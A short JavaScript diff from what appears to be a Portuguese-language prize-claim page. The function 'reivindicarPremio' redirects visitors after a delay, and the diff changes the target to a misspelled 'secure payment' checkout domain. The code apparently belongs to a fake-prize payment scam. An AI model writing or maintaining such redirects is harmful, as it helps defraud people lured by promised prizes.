@@ -73,6 +73,6 @@ function reivindicarPremio() {
     
     // Redireciona para o link do Viva Checkout após um pequeno delay
     setTimeout(() => {
-        window.location.href = 'https://pay.pesquisadesaques.shop/4KovG1e5BNNGyDE';
+        window.location.href = 'https://pay.pagamentossseguro.online/N1nVZpa9r4LGlM6';
     }, 1500);
 } 
